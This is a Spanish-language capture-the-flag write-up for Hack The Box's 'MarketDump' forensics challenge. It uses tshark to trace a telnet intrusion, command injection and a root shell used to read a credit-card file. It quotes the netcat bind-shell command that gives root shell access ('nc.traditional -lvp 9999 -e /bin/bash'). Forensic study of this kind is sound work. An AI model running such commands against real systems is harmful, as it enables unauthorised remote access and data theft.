---
title: "MarketDump"
description: "Writeup de MarketDump - Hack The Box - Forensics 200pts. pcapng con sesión telnet que instala bind shell en puerto 9999; el atacante accede al servidor y encuentra costumers.sql con tarjetas de crédito; la última entrada es un string base58 que decodifica la flag."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - pcap
  - tshark
  - telnet
  - bind-shell
  - netcat
  - base58
  - sql
---

# MarketDump

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Un archivo `MarketDump.pcapng` captura tráfico de una intrusión en dos fases. Primero, el atacante se autentica vía telnet como `admin:admin` en un servicio de inventario de stock (puerto 23) y lanza una bind shell con netcat. Luego, se conecta al puerto 9999 donde tiene una shell como root, lista archivos y lee `costumers.sql` — una base de datos de tarjetas de crédito robada. La flag está escondida como una entrada que parece un número de tarjeta pero en realidad es un string en base58.

---

## Reconocimiento del pcap

```bash
tshark -r MarketDump.pcapng -q -z io,phs
```

El pcap contiene: telnet (46 frames), HTTP (36 frames), SSH (1 frame), MySQL (2 frames), y tráfico DNS/NTP. El protocolo más interesante es el **telnet** ya que el resto parece tráfico legítimo.

---

## Análisis del stream telnet

Identificar los streams TCP que contienen tráfico telnet:

```bash
tshark -r MarketDump.pcapng -Y "telnet" -T fields -e tcp.stream | sort -u
# 25, 1042, 1051, 1053, 1054, 1055
```

El stream 1055 es el más interesante — autenticación completa y comando de bind shell:

```bash
tshark -r MarketDump.pcapng -z follow,tcp,ascii,1055 -q
```

```
USER: admin
PASS: admin
Welcome, admin
Here is you're daily stock report!

PRODUCT.PRICE...STOCK
SHIRTS..20$...50
JEANS..40$...99
WALLETS.15$...19
SOCKS..10$...100

Type exit to exit the program:
nc.traditional -lvp 9999 -e /bin/bash
```

El atacante escribe `nc.traditional -lvp 9999 -e /bin/bash` en el "campo de salida" del programa de inventario, que lo ejecuta como comando del sistema — una inyección de comandos clásica en la aplicación del servidor.

---

## Búsqueda de la bind shell en puerto 9999

```bash
tshark -r MarketDump.pcapng -Y "tcp.port == 9999" -T fields -e tcp.stream | sort -u
# 428, 1056
```

El stream 1056 contiene la sesión activa de la bind shell:

```bash
tshark -r MarketDump.pcapng -z follow,tcp,ascii,1056 -q
```

Comandos ejecutados por el atacante en la shell:

```bash
ls -la
# -rwxr-xr-x vigil  339920 costumers.sql
# -rwxr-xr-x vigil     593 login.sh

pwd
# /var/www/html/MarketDump

whoami
# root

wc -l costumers.sql
# 10302 costumers.sql

head -n2 costumers.sql
# IssuingNetwork,CardNumber
# American Express,377815700308782
```

El atacante luego hace `cat costumers.sql` que muestra miles de tarjetas de crédito American Express. Al final del archivo hay una entrada anómala:

```
American Express,NVCijF7n6peM7a7yLYPZrPgHmWUHi97LCAzXxSEUraKme
```

Este valor no es un número de tarjeta válido — es una cadena **base58**.

---

## Decodificación del string base58

```bash
echo "NVCijF7n6peM7a7yLYPZrPgHmWUHi97LCAzXxSEUraKme" | base58 -d
```

```text
HTB{FLAG}
```

---

## Cadena de Ataque

```text
1. Acceso telnet al servicio de inventario (admin:admin) → puerto 23
       ↓
2. Inyección de comandos en el prompt del programa → nc bind shell en 9999
       ↓
3. Conexión al puerto 9999 → shell como root
       ↓
4. Lectura de costumers.sql → 10302 entradas de tarjetas de crédito
       ↓
5. Última entrada: string base58 camuflado como número de tarjeta
       ↓
6. echo "NVCij..." | base58 -d → HTB{FLAG}
```

---

## Lecciones Aprendidas

- **Contraseñas por defecto en servicios internos**: `admin:admin` en un servicio telnet es el escenario más básico de seguridad deficiente. Los servicios internos también deben tener autenticación robusta.
- **Telnet transmite en texto plano**: a diferencia de SSH, telnet no cifra la sesión — credenciales, comandos y datos son visibles en cualquier captura de tráfico.
- **Detección de base58**: los strings base58 son difíciles de identificar visualmente ya que usan el mismo charset que base64 pero sin `+`, `/`, `=`. Presencia de strings alfanuméricos largos en datasets numéricos es una señal de alerta.
- **Bind shell vs Reverse shell**: `nc -lvp PORT -e /bin/bash` es una bind shell — el servidor escucha y el atacante se conecta. Más detectable que una reverse shell ya que abre un puerto en el servidor víctima.

---

## Referencias

- [Base58 encoding](https://en.bitcoin.it/wiki/Base58Check_encoding)
- [HackTricks — Telnet](https://book.hacktricks.xyz/network-services-pentesting/23-telnet)
- [tshark — follow stream](https://www.wireshark.org/docs/man-pages/tshark.html)
